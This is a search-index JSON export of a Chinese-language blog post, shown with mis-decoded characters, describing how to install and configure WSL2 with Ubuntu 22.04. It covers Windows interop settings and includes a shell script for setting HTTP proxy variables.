[{"categories":["Misc"],"content":"æ—¥å¸¸","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"çæŠ˜è…¾äº†ä¸€ä¸‹WSL2ï¼ŒçœŸçš„å¾ˆé¦™å•Šï½ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:0:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"TL;DR ç¼˜ç”±å¯èƒ½è°éƒ½æƒ³ä¸åˆ°ï¼Œæˆ‘åœ¨åƒé¥­çš„æ—¶å€™åˆ·æ‰‹æœºï¼Œçœ‹åˆ°ä¸€ä¸ªä»Šå¹´ DefCONä¸ŠLiveCTFçš„è§†é¢‘ï¼Œå‘ç° perfect râ€»â€»â€»t åœ¨è§£é¢˜çš„æ—¶å€™ç”¨çš„æ˜¯wslã€‚å…¶å®è¿™ä¸œè¥¿å¾ˆæ—©ä¹‹å‰æˆ‘è¯•è¿‡ï¼Œä½†æ˜¯å½“æ—¶å‡ºäºæ²¡æœ‰å›¾å½¢åŒ–ç•Œé¢å’Œæ–‡ä»¶copyç­‰æ“ä½œçš„ä¸æ–¹é¢çš„è€ƒè™‘ï¼ˆå…¶å®æœ€ä¸»è¦æ˜¯çœ‹åˆ°å¾ˆå¤šè¯„è®ºè¯´æœ‰bugï¼Œæˆ‘æ˜¯å›¾ç¨³å®šï¼Œä¸æ˜¯ä¸ºäº†å»è§£å†³å„ç§bugï¼‰ï¼Œæ²¡æœ‰æ·±å…¥å»ä½¿ç”¨ï¼Œåªæ˜¯å®‰è£…å®Œï¼Œä½“éªŒäº†ä¸€ä¸‹ï¼Œå®˜æ–¹æ–‡æ¡£éƒ½æ²¡çœ‹çš„é‚£ç§ä½“éªŒï¼Œå°±å¸è½½äº†ã€‚ä½†æ˜¯ï¼Œæˆ‘çœ‹è§†é¢‘çš„æ—¶å€™ï¼Œå‘ç° perfect râ€»â€»â€»t å±…ç„¶å¯ä»¥ç›´æ¥åœ¨WSLé‡Œå¯åŠ¨Windowsä¸Šçš„IDAã€‚è¿™æŠŠæˆ‘æƒŠè‰³åˆ°äº†ï¼ï¼ˆæ²¡æœ‰å»çœ‹è¿™ä¸ªåŠŸèƒ½ä»€ä¹ˆæ—¶å€™å‡ºç°çš„ï¼Œä½†æ˜¯å°±æ˜¯ä¸€è§é’Ÿæƒ…çš„æ„Ÿè§‰~ï¼‰è¿™æ ·çš„è¯ï¼Œæˆ‘å¯ä»¥ç›´æ¥åœ¨WSLé‡ŒæŠŠé¢˜ç›®ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åç›´æ¥åœ¨å‘½ä»¤è¡ŒæŠŠIDAæ‹‰èµ·æ¥ï¼Œå†™expçš„è¯å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡ŒæŠŠcodeæ‹‰èµ·æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡æ˜¯åŸºäºLinuxè¿˜æ˜¯Windowsçš„æ“ä½œï¼Œéƒ½å¯ä»¥ç›´æ¥åœ¨WSLé‡Œå®Œæˆï¼Œå®Œå…¨ä¸éœ€è¦å»æ‰‹åŠ¨æ‰¾è½¯ä»¶ã€æ‹–æ–‡ä»¶è¿™äº›æ“ä½œï¼Œç®€ç›´ä¸æ»‘~äºæ˜¯ï¼Œå¼€å§‹æŠ˜è…¾ã€‚ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:1:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2 ä¸å¤ªé‡è¦çš„ç®€ä»‹ é¦–å…ˆç»™å‡ºMicrosoftçš„å®˜æ–¹æ–‡æ¡£ï¼Œå¼ºçƒˆå»ºè®®ç›´æ¥çœ‹å®˜æ–¹çš„åŸç‰ˆè‹±æ–‡æ–‡æ¡£ã€‚åŸºæœ¬ä¸Šåç»­é‡åˆ°çš„é—®é¢˜ï¼Œåœ¨è¿™é‡Œéƒ½ä¼šæœ‰å¯¹åº”çš„è§£ç­”ï¼Œä¸æ˜¯å…¨éƒ¨ï¼Œæ˜¯å¤§éƒ¨åˆ†ã€‚ è¿™é‡Œè´´ä¸€éƒ¨åˆ†ï¼Œä¸æƒ³å»çœ‹å®˜æ–¹æ–‡æ¡£çš„å¬æˆ‘ç»™ä½ ç™½è¯ç™½è¯å§ï¼š WSLï¼Œå…¨ç§°â€œWindows Subsystem for Linuxâ€ï¼Œå°±æ˜¯Windowsä¸‹çš„Linuxå­ç³»ç»Ÿï¼Œå®ƒæ˜¯å¾®è½¯ä¸ºå¼€å‘è€…åœ¨Windowsä¸Šå¼€å‘çš„ä¸€ä¸ªGNU/Linuxç¯å¢ƒï¼ŒåŒ…æ‹¬å¸¸è§„çš„å‘½ä»¤è¡Œå·¥å…·ã€åŸºç¡€è®¾ç½®å’Œåº”ç”¨ã€‚æœ‰äº†å®ƒï¼Œä½ ä¸éœ€è¦å†å®‰è£…è™šæ‹Ÿæœºï¼Œå¯ä»¥ç›´æ¥é€šè¿‡Windowså»åˆ°ä¸€ä¸ªLinuxç¯å¢ƒä¸­ï¼Œä½è€—èƒ½ã€é«˜æ•ˆç‡ã€‚ åœ¨WSLä¸­ï¼Œä½ å¯ä»¥è¿›è¡Œçš„æ“ä½œï¼š ç›´æ¥é€šè¿‡Microsoft Storeå®‰è£…GNU/Linuxçš„å‘è¡Œç‰ˆæœ¬ï¼› è¿è¡Œå¸¸è§„çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä¾‹å¦‚ grep, sed, awk å’Œå…¶ä»–çš„ ELF-64 äºŒè¿›åˆ¶ç¨‹åºï¼› è¿è¡Œ Bash shell scriptså’ŒGNU/Linuxå‘½ä»¤è¡Œå·¥å…·ï¼ŒåŒ…æ‹¬ï¼š Tools: vim, emacs, tmux Languages: NodeJS, Javascript, Python, Ruby, C/C++, C# \u0026 F#, Rust, Go, etc. Services: SSHD, MySQL, Apache, lighttpd, MongoDB, PostgreSQL. ä½¿ç”¨ä½ å®‰è£…çš„GNU/Linuxå‘è¡Œç‰ˆçš„åŒ…ç®¡ç†å·¥å…·å®‰è£…è½¯ä»¶ï¼› ä½¿ç”¨ Unix-like å‘½ä»¤è¡Œ shell è°ƒç”¨ Windows åº”ç”¨ç¨‹åºï¼› åœ¨ Windows ä¸Šè°ƒç”¨ GNU/Linux åº”ç”¨ç¨‹åºï¼› ç›´æ¥åœ¨Windowsçš„æ¡Œé¢ç¯å¢ƒä¸­è¿è¡ŒGNU/Linuxå›¾å½¢åŒ–ç¨‹åºï¼› ä½¿ç”¨GUPåŠ é€Ÿè¿›è¡Œæœºå™¨å­¦ä¹ ã€æ•°æ®åˆ†æå’Œå…¶ä»–çš„é«˜æ€§èƒ½è®¡ç®—åœºæ™¯ã€‚ åŸºæœ¬ä¸Šå°±æ˜¯ä¸€ä¸ªâ€œåŠ å¼ºç‰ˆâ€çš„Linuxï¼ŒåŠ å¼ºçš„ç‚¹åœ¨äºæ‰“é€šäº†è™šæ‹Ÿç¯å¢ƒä¸­çš„Linuxä¸ç‰©ç†ç¯å¢ƒçš„Windowsçš„æ²Ÿé€šå’Œè”ç³»ï¼Œä¸ä»…ä»…æ˜¯è½¯ä»¶å±‚é¢ï¼Œç”šè‡³æ˜¯åˆ°è¾¾äº†ç¡¬ä»¶å±‚é¢ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨GPUçš„ç®—åŠ›ã€‚æˆ‘å¯¹è™šæ‹ŸåŒ–ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸çŸ¥é“å¸¸è§„çš„VMWareå’ŒVirtual Boxè¿™ç§è½¯ä»¶æ˜¯å¦ä¹Ÿèƒ½å®ç°è¿™ç§æ•ˆæœã€‚ WSL1è¿˜æ˜¯WSL2ï¼Ÿ è¿™é‡Œæ¯”è¾ƒæ¨èé¦–å…ˆçœ‹ä¸‹What is the Windows Subsystem for Linux (WSL)?ã€Whatâ€™s new with WSL 2?ã€Comparing WSL 1 and WSL 2è¿™ä¸‰éƒ¨åˆ†çš„å†…å®¹ï¼Œè‡³å°‘ä½ è¦æ‡‚å¾—ä½ æ­£åœ¨é¼“æ£çš„æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚è€Œä¸”ï¼ŒWSLæ˜¯æœ‰ä¸¤ä¸ªç‰ˆæœ¬çš„ï¼Œæˆ‘ä»¬ä½œä¸ºç”¨æˆ·å…ˆä¸ç®¡å†…éƒ¨å˜åŒ–ï¼Œæœ€ç›´è§‚çš„ä¸åŒæ˜¯å®‰è£…æ–¹å¼å’Œæ­¥éª¤çš„ä¸ä¸€æ ·ã€‚éè¦å¯¹æ¯”featureçš„è¯ï¼Œè¿™é‡Œç»™ä¸ªç›´è§‚å›¾ï¼š çœ‹äº†è¿™ä¸ªå›¾ä¹‹åï¼Œæˆ‘æœæ–­é€‰æ‹©äº†WSL2ï¼Œæ¯•ç«Ÿ Full Linux Kernel çš„æ”¯æŒåœ¨é‚£å¤ªè€€çœ¼äº†ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒWSL2å¯¹Windowsç‰ˆæœ¬æ˜¯æœ‰è¦æ±‚çš„ï¼Œå¿…é¡»æ˜¯ Windows 11 or Windows 10, Version 1903, Build 18362 or laterã€‚å¦‚æœä½ çš„ç³»ç»Ÿç‰ˆæœ¬ä½äºè¿™ä¸ªï¼Œæˆ‘çš„ä¸ªäººå»ºè®®æ˜¯å‡çº§ç³»ç»Ÿç‰ˆæœ¬å»ä½¿ç”¨WSL2ï¼Œå°½å¯èƒ½ä¸å†å»ä½¿ç”¨WSL1ï¼ˆbugå¤šï¼Œä¸”ä¿®å¤ç‡ä½åˆ°ç¦»è°±ã€‚æˆ‘ä¸€åº¦æ€€ç–‘æ˜¯ä¸æ˜¯WSL1çš„bugåˆ°äº†ä¸å€¼å¾—å†ä¿®å¤è€Œå¼€å‘äº†WSL2ï¼‰ã€‚ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:2:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"WSL2çš„å®‰è£…å’Œé…ç½® ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Install ç‰ˆæœ¬æ£€æŸ¥ â€‹ é¦–å…ˆç³»ç»Ÿç‰ˆæœ¬è¦æ±‚Windows 10ç‰ˆæœ¬ 2004 åŠæ›´é«˜ç‰ˆæœ¬ï¼ˆå†…éƒ¨ç‰ˆæœ¬ 19041 åŠæ›´é«˜ç‰ˆæœ¬ï¼‰æˆ– Windows 11ï¼Œæˆ‘è¿˜æ˜¯æ¯”è¾ƒå»ºè®®å¤§å®¶å‡çº§Windows 11çš„ï¼Œç›®å‰ä¸ºæ­¢è¿˜æ²¡æœ‰å‘ç°è®©æˆ‘å¿å—ä¸äº†çš„Bugã€‚ å¯ç”¨è™šæ‹ŸåŠŸèƒ½å’Œè™šæ‹Ÿæœºå¹³å°åŠŸèƒ½ å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹è‡ªå·±æ˜¯å¦å·²ç»å¼€å¯äº†è™šæ‹ŸåŒ–æ”¯æŒï¼šä»»åŠ¡ç®¡ç†å™¨-\u003eæ€§èƒ½ ç„¶åå¼€å¯é€‚ç”¨äºLinuxçš„Windowså­ç³»ç»ŸåŠŸèƒ½ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§æ˜¯ç®¡ç†å‘˜å¯åŠ¨PowerShellï¼Œæ‰§è¡Œï¼š dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartï¼Œå¦å¤–ä¸€ç§æ˜¯é€šè¿‡GUIæ¥å¼€å¯ï¼Œæ§åˆ¶é¢æ¿ -\u003e ç¨‹åºå’ŒåŠŸèƒ½ -\u003e å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½ ï¼š â€‹ ç„¶åå¯ç”¨è™šæ‹Ÿæœºå¹³å°åŠŸèƒ½ï¼šdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestartï¼ŒGUIçš„åœ¨ä¸Šé¢å·²ç»ç‚¹ä¸Šäº†ã€‚ æ›´æ–° Linux å†…æ ¸ï¼š è¿™ä¸€æ­¥æ˜¯ä¸€å®šè¦åšçš„ï¼Œé¿å…å‡ºç°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„-ã€‚-ï¼‰ï¼šwsl --updateã€‚è¿™é‡Œåœ¨æ›´æ–°å®Œå†…æ ¸ä¹‹åï¼Œæœ€å¥½æ˜¯é‡å¯ä¸€ä¸‹ç³»ç»Ÿï¼Œé¿å…åœ¨åé¢å®‰è£…å‘è¡Œç‰ˆçš„æ—¶å€™å‡ºé—®é¢˜ã€‚ è®¾ç½®WSL2ä¸ºé»˜è®¤ç‰ˆæœ¬ï¼š è¿™ä¸€æ­¥é—®é¢˜ä¸å¤§ï¼Œæ¯•ç«Ÿä½¿ç”¨WSL2é»˜è®¤ä¹Ÿä¼šæ˜¯2ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¸ºäº†ä¿é™©ï¼Œè¿˜æ˜¯è®¾ç½®ä¸€ä¸‹ï¼Œæ¯•ç«Ÿåœ¨ä¸€äº›æƒ…å†µä¸‹æ˜¯å¯ä»¥è·³è½¬åˆ°1ç‰ˆæœ¬çš„ï¼šwsl --set-default-version 2 ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:1","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Setting å‘è¡Œç‰ˆæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯Ubuntuï¼Œç”¨ä¹ æƒ¯äº†ï¼Œè€Œä¸”é€‰çš„æ˜¯22.04ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘çš„ä¸€äº›é¡¹ç›®éœ€è¦ä½¿ç”¨çš„Pythonç‰ˆæœ¬è¦æ±‚è¾ƒé«˜ï¼Œéœ€è¦æ˜¯3.10ã€‚ è¸©å‘ï¼š è¿™é‡Œæˆ‘æœ¬æ¥æ˜¯ä¸Šçš„20.04ç‰ˆæœ¬çš„Ubuntuï¼Œå®ƒçš„é»˜è®¤Pythonç‰ˆæœ¬æ˜¯3.8ï¼Œç„¶ååœ¨è·‘é¡¹ç›®çš„æ—¶å€™å‡ºç°äº†é—®é¢˜ã€‚æˆ‘å°±æƒ³ç€å†å¼„ä¸ªå¤šPythonç¯å¢ƒï¼Œè™½ç„¶è®¾ç½®é»˜è®¤Pythonç‰ˆæœ¬æ˜¯æ–°ä¸‹è½½çš„3.10ï¼Œä½†æ˜¯åœ¨apt installçš„æ—¶å€™è¿˜æ˜¯ä¼šç”¨ç³»ç»Ÿçš„Pythonã€‚ä½†æ˜¯ï¼Œæˆ‘åˆä¸æƒ³æ›´æ”¹ç³»ç»Ÿå…¨å±€Pythonç‰ˆæœ¬ï¼ˆé¬¼çŸ¥é“ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜-ã€‚-ï¼‰ã€‚ åœ¨å®‰è£…pipçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä½¿ç”¨çš„ç³»ç»Ÿç‰ˆæœ¬Pythonï¼Œæ‰€ä»¥ä¸‹è½½ä¸‹æ¥çš„pipéƒ½æ˜¯åŸºäº3.8çš„ã€‚æ‰€ä»¥æˆ‘å°±ç”¨get-pip.pyå»å®‰è£…3.10çš„pipï¼Œä½†æ˜¯é‡åˆ°äº†ç½‘é€Ÿé—®é¢˜ï¼Œæ ¹æœ¬ä¸‹è½½ä¸ä¸‹æ¥ï¼Œä¸Šäº†ä»£ç†ä¹Ÿæ˜¯ä¸ç®¡ç”¨ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ è¢«ç½‘ç»œé—®é¢˜æçƒ¦äº†ä¹‹åï¼Œæˆ‘å°±å†³å®šæ¢æœ€æ–°çš„22ç‰ˆæœ¬äº†ã€‚ä¸€å¼€å§‹ä¸»è¦æ˜¯æ‹…å¿ƒå¯èƒ½ä¼šå­˜åœ¨é€‚é…é—®é¢˜ä¸ç¨³å®šï¼Œæ‰€ä»¥å…ˆä¸Šäº†ä½¿ç”¨æœ€å¤šçš„20ç‰ˆæœ¬ï¼Œä½†æ˜¯ç°åœ¨å®åœ¨æ˜¯ä¸æƒ³å»è§£å†³20ç‰ˆæœ¬ä¸Šçš„Pythonç¯å¢ƒé—®é¢˜äº†ã€‚å¥½å§ï¼Œæˆ‘æ‰¿è®¤æˆ‘æ‡’äº†~ ç›´æ¥åœ¨ Microsoft Store æœç´¢ Ubuntuï¼Œé€‰æ‹©22ç‰ˆæœ¬ä¸‹è½½å³å¯ã€‚å¦‚æœä½ çš„åœ°åŒºåœ¨CNï¼Œé€€æ‰ä½ çš„ä»£ç†ï¼Œç½‘é€Ÿä¼šå¿«ä¸€äº›ã€‚ ä¸‹è½½å®‰è£…å®Œæˆåï¼Œåœ¨å¼€å§‹èœå•å’Œåº”ç”¨ç¨‹åºåˆ—è¡¨ä¸­ä¹Ÿä¼šå‡ºç°æ–°å¢çš„Ubuntu 22.04ï¼š ç‚¹å‡»å¯åŠ¨ï¼Œç„¶åæ ¹æ®æç¤ºå»ºç«‹ç”¨æˆ·å’Œè®¾ç½®å¯†ç ï¼Œå³å¯å®‰è£…å®Œæˆã€‚ ç„¶ååœ¨ terminal ä¸­æŸ¥çœ‹å®‰è£…æƒ…å†µï¼š è¿›å…¥åˆ°è¿™ä¸ªUbuntuæœ‰ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥ç‚¹å‡»è¿™ä¸ªåº”ç”¨ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªshellï¼š è¿™ç§æˆ‘ä¸å–œæ¬¢ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥åœ¨ Terminal ä¸­ç›´æ¥è¾“å…¥ ubuntu2204.exe æ¥å¯åŠ¨ï¼ˆåªæ‰“ubuntuå³å¯ï¼Œä¼šè‡ªåŠ¨è¡¥å…¨ï¼‰ï¼š é€€å‡ºçš„è¯å¯ä»¥ç›´æ¥ exit æ˜¯æ³¨é”€ç™»å½•ï¼Œä½†æ˜¯ç³»ç»Ÿè¿˜æ˜¯åœ¨åå°æ‰§è¡Œçš„ã€‚å¯ä»¥ç”¨ wsl --shutdown æ¥å…³æ‰åå°è¿è¡Œçš„Ubuntuã€‚ï¼ˆshutdownä¼šå°†æ‰€æœ‰çš„å‘è¡Œéƒ½å…³æ‰-ã€‚-ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ è·‘äº†ä¸¤ä¸ªUbuntuï¼Œä¸¤ä¸ªéƒ½ä¼šè¢«å…³æœºã€‚ï¼‰å…³æ‰å•ä¸ªå‘è¡Œå¯ä»¥ç”¨ wsl --terminate \u003cdistro\u003e è¿™ç§å‘½ä»¤ï¼Œå°±åªä¼šå…³æ‰ä½ æŒ‡å®šçš„å‘è¡Œç‰ˆæœ¬äº†ã€‚ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:3:2","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"Ubuntuçš„ä¼˜åŒ–å’Œé…ç½® ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:0","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"1. å¸¸è§„Ubuntué…ç½® è¿›æ¥ä¹‹åï¼Œå¯ä»¥è¿›è¡Œå¸¸è§„çš„Ubuntuçš„é…ç½®ã€‚ åœ¨å®‰è£…ä¹‹å‰ï¼Œæœäº†ä¸€äº›å…³äºqemuçš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œåœ¨å®‰è£…çš„æ—¶å€™ç›´æ¥aptå®‰è£…çš„ï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä¼°è®¡æ˜¯WSL2ç‰ˆæœ¬å‡çº§å·²ç»è§£å†³äº†ç½‘ä¸Šå­˜åœ¨çš„ä¸€äº›Bugã€‚ï¼ˆå¦‚æœæ˜¯ç”¨WSL1çš„è¯ï¼Œä½ è¿˜è¦é¢å¤–é…ç½®qemu-kvmç­‰å¾ˆå¤šä¸œè¥¿ï¼Œåæ­£æˆ‘æ˜¯å«Œéº»çƒ¦ã€‚ï¼‰ ","date":"2022-11-23","objectID":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/:4:1","tags":["Misc"],"title":"WSL2çš„å°æŠ˜è…¾","uri":"/2022/11/wsl2%E7%9A%84%E5%B0%8F%E6%8A%98%E8%85%BE/"},{"categories":["Misc"],"content":"2. ä¸Windowsäº¤äº’ 1. æ–‡ä»¶å…±äº« WSLé‡Œé¢ä¼šè‡ªåŠ¨å°†Windowsçš„æ–‡ä»¶ç›˜æŒ‚åœ¨åˆ°/mntç›®å½•ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥åœ¨/mntç›®å½•ä¸‹çœ‹åˆ°Windowsçš„å„ä¸ªç›˜çš„æ–‡ä»¶ï¼Œè¿™æ˜¯é»˜è®¤é…ç½®ï¼Œä¸éœ€è¦è®¾ç½®ã€‚æ­¤å¤–ï¼Œåœ¨Windowsçš„æ–‡ä»¶èµ„æºç®¡ç†å™¨é‡Œï¼Œåœ¨å·¦è¾¹çš„ç›®å½•çš„æœ€ä¸‹é¢ä¼šæœ‰ä¸€ä¸ª Linux ï¼Œé‡Œé¢å°±æ˜¯WSLå®‰è£…çš„å‘è¡Œç‰ˆæœ¬çš„æ–‡ä»¶ç³»ç»Ÿã€‚ æ‰€ä»¥ä½ æŠŠè¦åˆ†æçš„æ–‡ä»¶æ”¾åœ¨ä»€ä¹ˆä½ç½®éƒ½æ²¡æœ‰å…³ç³»ï¼Œä¸¤ä¸ªç³»ç»Ÿéƒ½å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å»è®¿é—®åˆ°ã€‚ 2. åº”ç”¨è°ƒç”¨ WSLå¯ä»¥ç›´æ¥è°ƒç”¨Windowsçš„åº”ç”¨ç¨‹åºï¼Œè¿™æ˜¯å› ä¸ºWSLé»˜è®¤ä¼šæŠŠWindowsçš„ç¯å¢ƒå˜é‡ä¹ŸåŒ…å«è¿›æ¥ï¼š ä½†æ˜¯è¿™æ ·å¾ˆå¤šäººä¸å–œæ¬¢ï¼Œå› ä¸ºç³»ç»Ÿéš”ç¦»æ€§å¾ˆå·®ï¼Œåœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œä¸å¤ªå®¹æ˜“åŒºåˆ†ï¼Œå¾ˆå®¹æ˜“åœ¨Linuxä¸­æŠŠWindowsçš„å·¥å…·ç»™æ‹‰èµ·æ¥ï¼š å»æ‰Windowsç¯å¢ƒå˜é‡ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåœ¨ wsl ä¸‹æ–°å»º /etc/wsl.conf é…ç½®æ–‡ä»¶ï¼Œå¹¶ç¼–è¾‘å¦‚ä¸‹å†…å®¹ï¼š [interop] appendWindowsPath = false ç„¶åé‡å¯ WSL å³å¯ã€‚ ä½†æ˜¯æˆ‘ä¸ªäººæ„Ÿè§‰æŠŠï¼Œä¸ºäº†åªåœ¨å‘½ä»¤è¡Œå·¥ä½œï¼Œæˆ‘æ˜¯ä¿ç•™äº†Windowsçš„ç¯å¢ƒå˜é‡çš„ï¼Œå› ä¸ºè¿™æ ·æˆ‘å…¨ç¨‹éƒ½å¯ä»¥åœ¨WSLä¸­å·¥ä½œï¼Œä¸éœ€è¦æ¥å›åˆ‡æ¢ç¯å¢ƒã€‚å°¤å…¶æ˜¯å¯¹äºå¼€å‘æ¥è¯´ï¼Œå…¶å®å¯ä»¥è®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œåœ¨ä¸¤ä¸ªç³»ç»Ÿä¸­é€šç”¨ã€‚è¿™æœ¬æ¥æ˜¯WSLçš„ä¸€ä¸ªäº®ç‚¹ï¼Œåº”è¯¥å¥½å¥½åŠ ä»¥åˆ©ç”¨ã€‚ å¦‚æœä½ å®åœ¨å¿å—ä¸äº†è¿™ä¹ˆå¤šçš„ç¯å¢ƒå˜é‡ï¼Œå°±åœ¨ PATH åé¢å•ç‹¬åŠ ä¸Šå·¥å…·çš„è·¯å¾„ï¼Œå°±æ˜¯/mntå¼€å¤´ï¼Œå°±åƒä¸Šé¢çš„å›¾é‡Œçš„æœ€åä¸¤ä¸ªã€‚ 3. ç½‘ç»œä»£ç† WSLé…ç½®ä»£ç†ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œä½†æ˜¯ç½‘ä¸Šçš„ä¸€äº›æ•™ç¨‹å­˜åœ¨é—®é¢˜ï¼Œæ‰€ä»¥éœ€è¦å®è·µä¸€ä¸‹ã€‚ ä»£ç†ï¼Œæ— éå°±æ˜¯è®¾ç½®httpã€httpsã€socksçš„è½¬å‘å˜›ï¼Œä½†æ˜¯å¯¹äºWSLæ¥è¯´ï¼Œæœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š é¦–å…ˆï¼Œè¦ç¡®ä¿ä½ çš„ä»£ç†è½¯ä»¶æ˜¯å¼€äº†LANçš„ä»£ç†åŠŸèƒ½çš„ï¼Œè¿™æ ·æ‰èƒ½è½¬åˆ°WSLé‚£è¾¹å»ï¼š ç„¶åï¼Œä»£ç†çš„IPåœ°å€ä¸æ˜¯å†™WSLè‡ªèº«çš„IPåœ°å€ï¼Œè€Œæ˜¯å†™ç½‘å…³åœ°å€ï¼Œä¹Ÿå°±æ˜¯Windowsä¸­çš„WSLåœ°å€ï¼š æœ€åï¼Œå°±æ˜¯å¸¸è§„çš„ export å‘½ä»¤äº†ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼š âœ¨ğŸŒŠ v4ler1an ~ âœ cat proxy.sh #!/bin/sh hostip=$(cat /etc/resolv.conf | grep nameserver | awk '{ print $2 }') wslip=$(hostname -I | awk '{print $1}') port=7890 PROXY_HTTP=\"http://${hostip}:${port}\" set_proxy(){ export http_proxy=\"${PROXY_HTTP}\" export HTTP_PROXY=\"${PROXY_HTTP}\" export https_proxy=\"${PROXY_HTTP}\" export HTTPS_proxy=\"${PROXY_HTTP}\" export ALL_PROXY=\"${PROXY_SOCKS5}\" export all_proxy=${PROXY_SOCKS5} git config --global http.https://github.com.proxy ${PROXY_HTTP} git config --global https.https://github.com.proxy ${PROXY_HTTP} echo \"[+] Proxy has been opened.\" echo \"[+] Git uses proxy too.\" } unset_proxy(){ unset http_proxy unset HTTP_PROXY unset https_proxy unset HTTPS_PROXY unset ALL_PROXY unset all_proxy git config --global --unset http.https://github.com.proxy git config --global --unset https.https://github.com.proxy echo \"[+] Proxy has been closed.\" echo \"[+] Git setting has been cleaned.\" } test_setting(){ echo \"[+] Host IP: \" ${hostip} echo \"[+] WSL IP: \" ${wslip} echo \"[+] Try to connect to Google...\" resp=$(curl -I -s --connect-timeout 5 -m 5 -w \"%{http_code}\" -o /dev/null www.google.com) if [ ${resp} = 200 ]; then echo \"[+] Proxy setup succeeded!\" else echo \"[+] Proxy setup failed!\" fi } if [ \"$1\" = \"set\" ] then set_proxy elif [ \"$1\" = \"unset\" ] then unset_proxy elif [ \"$1\" = \"test\" ] then test_setting else echo \"[+] Unsupported arguments.\" fi ç„¶åå†è®¾ç½®ä¸€ä¸‹aliaså°±å¯ä»¥äº†ï¼š alias proxy='source ~/proxy.sh set' alias unproxy='source ~/proxy.sh unset' alias ptest='source ~/proxy.sh test' 